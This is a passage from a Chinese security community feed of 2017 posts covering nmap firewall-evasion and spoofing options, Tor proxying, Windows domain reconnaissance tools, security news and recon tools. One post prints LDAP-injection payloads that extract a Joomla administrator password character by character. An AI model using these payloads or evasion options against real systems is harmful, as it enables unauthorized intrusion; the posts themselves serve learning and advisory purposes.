--min-rate <number>:设置最小扫面级别，使扫描不少于<number>个包每秒
--man-rate <number>:设置最大扫描几倍，使扫描不大于<bumber>个包每秒


防火墙/IDS躲避和欺骗
-f /--mtu：<val>:设置最大传输路径单元，最大的MTU单元是由最小的传输单元决定的，比如网络中某个路径mtu是123，你的是124，通过-f参数，可以设置mtu
-D <decoy1 decoy2>[,ME],......>：通过噪声进行地址欺骗
-S:欺骗源地址
-E：指定网卡
-g:指定源端口
--proxies:指定代理，掩护自己
--data <hex strings>:除了正常的探测，在数据包中加入自己的数据，这个数据必须是十六进制
--data-string <string>:添加ASCII码
--data-lentgh <nums>：限制数据长度
--ip-option <option>：发送有特定ip选项的探测包
--ttl <val>:设置ttl值
--spoof-mac <mac address/prefix/vendor name>:欺骗源MAC地址
--badsum:发送异常校验值的包，欺骗某些防火墙

输出：
-oN/-oX/-oS/-oG:指定输出的文件类型
-oA： <basename>:输出三种主要格式
-v:显示详细信息
-d:增加debug程度
--reason:显示某个异常或者特别的端口
--open:只显示开放或者可能开放的端口
--packet-trace:包追踪
--iflist：打印主机的网卡接口和路由（用于debug）
--append-output:没使用过，不清楚
--resume <filename>:重新开始一个失败的扫描
--stylesheet <path/URL>:将输出转换成XML格式并且以html输出
--webxml:参考Nmap.org上的样式制作更加轻量级的xml
--no-stylesheet:不解析成任何扩展性语言

杂项：
-6：允许ipv6的探测
-A:组合系统探测、系统版本探测，脚本扫描和路由追踪
--send-eth/--send ip:使用原始以太网和ip包进行发送
--datadir <dirname>:查找nmap数据的执行目录
--unprivileged:假定用户没有原始socket权限
--privileged:假定用户是最高权限的
-V:显示版本信息
-hL:打印帮助菜单

用了一个下午翻译，如果有错误可以留言，大家互相交流



...

<img src="https://file.xiaomiquan.com/9e/a0/9ea0c3d113079d89e8aa7eb1636f1866f9e7fb4430d1bfd503116db4f11f2a7e.jpg" width="25px"/> __吴奇__: 收集了

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: nmap网上的教程太多，建议分享一些自己常用参数组合，我自己觉得带脚本的扫描比较慢，而且效果一般

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 我觉得lua脚本的速度的话还是不错的，并且nmap使用场景实在太多，分享常用组合的话不知从何说起，不过我后面会介绍主动信息收集的内容，里面会有我对不同部分的nmap的用法的说明


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-22:


__#资源#__

  Awesome Pentest Cheat Sheets

极好的渗透测试清单。嗯，这个老外汇总整理了不少精彩的 Cheat Sheets，确实很有用。

发现我开源的 XSS’OR 也在其中，很好很好，等着下一版本我的大升级，绝对不仅仅是加解密优秀啊...

细节见：


[GitHub - coreb1t/awesome-pentest-cheat-sheets: Col...](https://github.com/coreb1t/awesome-pentest-cheat-sheets)





...

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 要升级了吗？期待！


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-22:

分享一个小tips：如何愉快地Tor

首先你要有个ss服务器，在你的VPS上apt-get install tor proxychains
然后再开一个ss进程
proxychains ss-server -c config.json -f pid 2

此时本机上流量走你的ss就自然通过Tor了，延迟还不错哦



...

<img src="https://file.xiaomiquan.com/c4/e2/c4e2337e4bf259351a4901662d84873c79cfb48880892a23d7c754b817ea4ad5.jpg" width="25px"/> __np__: 长姿势了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: proxychains代理辅助神器，不小心又发车了

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 如果你的ss稳定实测这种方式能有平均2Mb的速度

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 这图让我回忆起了热血新纪录撑杆跳那关……

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 😂

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 请问不是说现在的ss能被检测到吗？ssr可以嘛

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 别干坏事，别卖东西，没人管你

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 就怕被人误导等发现了还没退出，就被枪毙咯

<img src="https://file.xiaomiquan.com/3e/bc/3ebce5c2bb67c5ad0ea4e2d0dd0d9b2c60e444bc18d1021d44aea7b315216686.jpg" width="25px"/> __heather__: 混淆提速

<img src="https://file.xiaomiquan.com/f1/cd/f1cd5ee079f57ef0999999f8ccf3b20cfc72e953eee382ad7936d39e7cec9e81.jpg" width="25px"/> __maodidi__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 你这个图好酷啊，可以问一下是什么程序吗？

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/f1/cd/f1cd5ee079f57ef0999999f8ccf3b20cfc72e953eee382ad7936d39e7cec9e81.jpg" width="25px"/> __maodidi__: 这是arm，Tor官方的图形化界面(字符图形化)

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 又开车

<img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 请问ssr可以吗？

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d0/9b/d09be42dca6da1cd2e393da9bf83693bc0fec1c7b7973571e760bda8af5f738b.jpg" width="25px"/> __葫芦娃__: 理论上可以的，实践一下才知道


...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-21:

PowerView的作者HarmJ0y写的一些该脚本的使用方法，windows域的侦察方法基本上都涵盖到了。HarmJ0y是SpecterOps公司的员工，是Empire、BloodHound、PowerView、Veil-Framework、PowerSploit 这些工具的主要开发者之一。


[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)



[The PowerView PowerUsage Series #1 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/)



[The PowerView PowerUsage Series #2 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/)



[The PowerView PowerUsage Series #3 – harmj0y](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 都是神器，服

<img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 只能看懂百分之二十[捂脸]我感觉别的不敢说，在贵圈待久了我英语阅读能力可以提高

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/55/63/5563fa6232ef0292366eafe32d3885655e0633e38d449bdc9f4393ff593695e3.jpeg" width="25px"/> __Sunglassescat__: 必须能提高[偷笑]


...

---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-21:


[CptJesus | SharpHound: Evolution of the BloodHound...](https://blog.cptjesus.com/posts/newbloodhoundingestor)



[GitHub - BloodHoundAD/SharpHound: The BloodHound C...](https://github.com/BloodHoundAD/SharpHound)



BloodHound团队这两天用c#重写了BloodHound的扫描端，解决不少线程性能问题，还加入了缓存机制，对大型域网络更容易进行扫描了。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 佩服，居然C#重写，而且还继续开源

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这个团队正好是specterops公司的，一个大牛云集的红队公司。

<img src="https://file.xiaomiquan.com/14/0f/140fb95e9c03f1ea592d0b97e3860eebaa2d094c683a2412a5db396e7211c8be.jpg" width="25px"/> __cx__ replies to <img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__: 简称红牛


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-21:


__#工具#__

  Kali 终于更新了 2017.2

渗透必玩的系统。增加了一些最近流行的渗透利器，不过怎么没 Empire？

具体见：


[Kali Linux 2017.2 Release | Kali Linux](https://www.kali.org/news/kali-linux-2017-2-release/)





...

<img src="https://file.xiaomiquan.com/d6/d5/d6d579950069a1651dcc88167d48c568484f44b64ac4204081d8ea1a5ac58dd4.jpg" width="25px"/> __锐__: 问个小白级别的问题…Kali这么牛逼为啥不收费呢[皱眉]

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d6/d5/d6d579950069a1651dcc88167d48c568484f44b64ac4204081d8ea1a5ac58dd4.jpg" width="25px"/> __锐__: 好问题，他们公司靠这个打了全球知名度，可以靠如精品培训、渗透测试来活得很好，另外他们的系统整合的工具也都是免费或开源，有相关协议约定。

如果是我们，我们也会选择免费。

<img src="https://file.xiaomiquan.com/d9/83/d983446a8ffcdfd10ba9cdb5b8bcbbfdd420c13f551b433c50505732578f4e6f.jpg" width="25px"/> __冰山。__: 美滋滋

<img src="https://file.xiaomiquan.com/e4/ca/e4ca0340ac566f302dcda0afe835affed902e62dda2344fce0b7f9ac7cde2f21.jpg" width="25px"/> __safecat__: 不知道跟每日版有什么差别

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e4/ca/e4ca0340ac566f302dcda0afe835affed902e62dda2344fce0b7f9ac7cde2f21.jpg" width="25px"/> __safecat__: 一般每日build的都是最新的 但是都不是保证稳定的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-21:


__#漏洞#__

  Joomla 爆 LDAP 注入漏洞（CVE-2017-14596）

版本在 1.5  到 3.7.5 范围且使用了 LDAP 作为登录认证的 Joomla，都可以被拿下。

被拿下指：管理员账号密码可以通过 LDAP 被注射出来，导致后台沦陷，并可能通过后台自定义扩展来拿下整个网站权限。

这是一个非常低级的 LDAP 注入问题：

XXX;(&(uid=Admin)(userPassword=A*))
XXX;(&(uid=Admin)(userPassword=B*))
XXX;(&(uid=Admin)(userPassword=C*))
...
XXX;(&(uid=Admin)(userPassword=s*))
...
XXX;(&(uid=Admin)(userPassword=se*))
...
XXX;(&(uid=Admin)(userPassword=sec*))
...
XXX;(&(uid=Admin)(userPassword=secretPassword))

升级到 3.8 可以修复这个问题。

参考：

[RIPS - Joomla! 3.7.5 - Takeover in 20 Seconds with...](https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/)





---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-20:


__#后门#__

   第一个 Chrome 挖矿扩展被发现

扩展是 SafeBrowse，14 万安装量...

打着“安全”旗号，利用用户电脑资源偷偷挖矿。细节见：


[First ever crypto-mining Chrome extension discover...](https://hotforsecurity.bitdefender.com/blog/first-ever-crypto-mining-chrome-extension-discovered-18992.html)

 

又是 Chrome 扩展的安全问题，Chrome 对扩展的安全审计得更严格了。

<img src="https://images.xiaomiquan.com/FmGrpCoWrNkErotTtUbOGhh8yCrI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:RN7nkeZfNDTQTTF2jHRpnfus5uU=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fq7UDlAIpRlaLrD0GvbewRGxqa3h?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Mjk-sIGWJ17fnIjDKjYoNLEDi60=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 早上看到一个扩展，当时还不知道为什么会有人去研发这个，现在知道了：

[GitHub - xd4rker/MinerBlock: A web extension to bl...](https://github.com/xd4rker/MinerBlock)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: MinerBlock 源码很简单，可以阻止基于浏览器的挖坑，但是如果挖矿平台是其他的就得自己去添加了

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 卧槽，最近 Chrome helper 总是搞得我 CPU 接近100%，风扇狂转，我去看看我的插件……

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 电脑空着也是空着，这叫资源有效利用[呲牙]


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-20:


__#后门#__

  用 Mac 电脑且安装了 iTerm2 终端应用的同学注意下这个：


[你的终端是安全的吗？iTerm2 中可能通过 DNS 请求泄漏隐私信息 - FreeBuf.COM ...](http://www.freebuf.com/news/148292.html)

 

失误性后门...



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 满世界都在爆后门


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-19:


__#姿势#__

 
这篇文章对shell的讲解很详细，很多反弹shell的姿势，都值得大家亲自实操一下，留档备用

[关于Shell你想知道的都在这儿 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/system/147768.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 顺便搜下本圈之前的相关内容，关键词“反弹”

<img src="https://file.xiaomiquan.com/e4/a3/e4a35aca44780c86e01abec3ba960db508eff18998da2b5570beec6b67c0df25.jpg" width="25px"/> __逝水东流__: 反弹

<img src="https://file.xiaomiquan.com/20/65/20658eaa8d16ed9755d78ccda9e0425d8807bec878b28208f0ec71ee8aa5bbff.jpg" width="25px"/> __。Cui mohan__: 文章作者是我同事😂


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-19:


__#资源#__

  推荐 ES6 标准入门（第3版）

引用文中的介绍：

ECMAScript 6.0（以下简称 ES6）是 JavaScript 语言的下一代标准，已经在2015年6月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。

...

因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现（另外的 ECMAScript 方言还有 Jscript 和 ActionScript）。日常场合，这两个词是可以互换的。

----------

前端黑领域，要打好的基础有两个：HTML5 与 ES6。这本书阮一峰所著，他的文章向来很清晰，推荐给大家，更难得的是这本书如果不买纸质版也行，他免费开放到网上了：


[ECMAScript 6 入门 - ECMAScript 6入门](http://es6.ruanyifeng.com)



<img src="https://images.xiaomiquan.com/FhJgACL4XHwo4897zP8LWl9AxBey?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lwWtpaOU2bu1KWCZlShEEhj-QqQ=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 赞 这种为推动技术书籍开源而努力的行为。当然，纸质书一定会。

<img src="https://file.xiaomiquan.com/38/86/388641fcd94a4c1e5a792c0f205f7ca95a91cc9e8602fd7ad417dec2bb7c4286.jpg" width="25px"/> __Luo__: python怎样？

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 刚看完上次分享的javascript入门笔记  这一波又有东西要学了[悠闲]


...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-19:


__#基础#__

被动信息收集之收尾和工具介绍

1、thehavarester:电子邮件，用户名和主机名/子域名信息收集工具，不支持代理,需要使用proxychains进行调用。调用搜索引擎以及社交媒体进行搜索
常用参数
 	-d:指定搜索的域
 	-l：要搜索的量
 	-b:指定搜索引擎
注意！！当搜索量过大会触发搜索引擎的保护机制！！

2、metagoofil ：基于google搜索的文档收集工具，同样需要使用proxychains进行调用，因为这个工具是基于google搜索引擎搜索的，除非设置了代理
参数：-d:指定域名
          -t:指定要搜索的文件
           -l:限制搜索量
	   -n:限制下载文件的量
	   -o：指定下载路径
	    -f:输出文件名
同样的，当搜索量过大会触发搜索引擎的保护机制！！

3、Maltego:一个十分牛逼的工具，可以将所有的被动信息收集集于一体，第一次使用需要注册，图形化工具，界面十分清晰。

以上的三个工具可以查看下面这个链接获得详细信息

    
[使用Kali Linux在渗透测试中信息收集 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/system/58096.html)



4、被动信息收集框架：recon-ng
recon-ng类似于msf，并且和msf的使用有异曲同工之妙，详细可以看下面的链接：
   
[web渗透信息侦察收集工具——Recon-ng - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/web/7385.html)



这次的收尾想了很久怎么写，但是我才疏学浅，而且这些工具需要大量的实践，限于篇幅，不能详细介绍，只能找比较好的链接，但是，分享仅仅是一个途径，真正的进步还是靠自己，以上介绍的工具使用大家一定要结合大量的实践并通过抓包了解是怎样的机制，不要只是限于工具的使用

安利最近差不多看完的一本书《Python黑帽子:黑客与渗透测试编程之道》，不要仅限于成为一个脚本小子！共勉



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-18:

> 匿名用户 提问：
余弦你好，我发现我的手机莫名其妙发短信给我妈，而且是诸如“我需要帮助”“SOS”这种，还附带高德导航的紧急定位链接，我这算是被黑客入侵了吗？现在我该怎么办？


应该算，不过如果是蠕虫应该会批量发给你通讯录里更多的用户。有没有可能是被恶搞，也注意下。以后这种问题强烈建议带上手机型号系统版本等详细场景信息，否则不好判断。

如果真被黑，对新手来说最好的方式，备份关键文件后，重置。



...

<img src="https://file.xiaomiquan.com/d6/d5/d6d579950069a1651dcc88167d48c568484f44b64ac4204081d8ea1a5ac58dd4.jpg" width="25px"/> __锐__: 提问者有没有向手机售后和高德客服求助过呢？

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 要带着着给骗子他妈发短信的信念，好好学技术。干他丫的[奸笑]

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 。。。。。😂

<img src="https://file.xiaomiquan.com/b1/f1/b1f1fabc7117b73bf83d5b60f1020dd2a009218032f7be33ce2f4f46924619a4.jpg" width="25px"/> __kxlzx__: 回答错误。
有些手机会让用户设置紧急联系号码，你设置成了你妈妈的，结果放兜里不小心连续按了几下特殊键，就发了。我blog有个文章，通过此功能加威胁恐吓找回手机，自己百度。

<img src="https://file.xiaomiquan.com/b1/f1/b1f1fabc7117b73bf83d5b60f1020dd2a009218032f7be33ce2f4f46924619a4.jpg" width="25px"/> __kxlzx__: 
[找回丢失半年的手机 | 空虚浪子心的灵魂](http://www.inbreak.net/archives/297)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b1/f1/b1f1fabc7117b73bf83d5b60f1020dd2a009218032f7be33ce2f4f46924619a4.jpg" width="25px"/> __kxlzx__: 赞呀，哈哈哈

<img src="https://file.xiaomiquan.com/94/18/9418682f2a382978615d0f976974426e60139af668ece32adef54e76b2260726.jpeg" width="25px"/> __Island Air__ replies to <img src="https://file.xiaomiquan.com/b1/f1/b1f1fabc7117b73bf83d5b60f1020dd2a009218032f7be33ce2f4f46924619a4.jpg" width="25px"/> __kxlzx__: 嗯嗯，我后来发现确实只是发送了紧急救助信息。


...

---

<img src="https://file.xiaomiquan.com/3e/75/3e7537bd2177c4dd5dd1b56e3c0042e0ff82aff34db92a1095cf97b73266c3ec.jpg" width="25px"/> __Aro_un@ATTOT__ on 2017-09-18:

ccleaner被植马，有安装对应版本的快速很新下。
[CCleaner, distributed by anti-virus firm Avast, co...](https://www.grahamcluley.com/ccleaner-backdoor/)



<img src="https://images.xiaomiquan.com/Fl2bm4eAlq_xoHvOh6tadAa8t_4Y?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:pml-gq9yfB0_giHCbAtwu4BPXhk=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 又震惊了……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 供应链劫持

<img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__: 5.25版本

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: ……懒得更新也能躲过一劫

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 最近供应链入侵有点多啊 难道是个趋势？不过，这种入侵的周期 成本以及能力 不是一般人和小团队能承受的。国家队是不是都准备上正面战场了啊…

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 小团队也可以承受，不过就看有没能力或运气去搞这一出


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-17:


__#经验#__

  有同学说跟不上本圈的节奏，想报名培训班，于是百度搜了几个出来发给我看，我一看都觉得不靠谱，实在太初级，太虚。

作为一名未来黑客，怎么能就这样轻易掉入一些靠 SEO 来推广的安全培训班？更残酷的是，如果你连门都入不了，还想成为黑客？

不过话虽如此，我是很明白入门之难，但是啊，你都加入本圈了，如果用心观察我们的分享，耐心决心去突破每一个线索，这就好像一面空白的墙，这里画一笔，那里画一笔，最终会发现，居然有了个轮廓出来了...

这个过程要多久？对于入门来说 1-2 年很正常。着急没用。但是呢，又必须加倍努力，现在玩安全的人越来越多，年纪也越来越小，你想想你曾经浪费了多少时间？

我们为什么到现在还没公开去办培训班，因为骨子里觉得，靠那种初级培训班出来的人，没什么意义，尤其是未来立志成为一名优秀黑客的人，当然如果不是这样，当我什么都没说。

我们现在做的培训目前来说都比较高端，也比较低调，没怎么去宣传。

如果非得开个初级培训班，我们宁愿是开引导性的，只要两天就好（比起那些靠 SEO 推广，动不动至少1个月的靠谱不知多少倍），师傅领进门，修行靠个人，需要手把手的还是自觉放弃吧。

黑客，本来就是特别有门槛的身份。那些搞点小东西就自诩黑客的或被新闻包装成黑客的，笑笑就好。

话说回来，本圈已经有些交流氛围了，如果你想发展得更快，那就参与交流互动，不应该害怕什么，你会发现交流进步更快，因为：逼的。

不要再试图建议我创建任何形式的群聊，群聊基本都是浪费生命，人生苦短，远离噪音！

<img src="https://images.xiaomiquan.com/Fr1fMRn3enxsi178UHFmwmgqOdls?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:XEiieCcDnUyVr801Fal3f204WUo=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 「人都是逼出来的」。😑

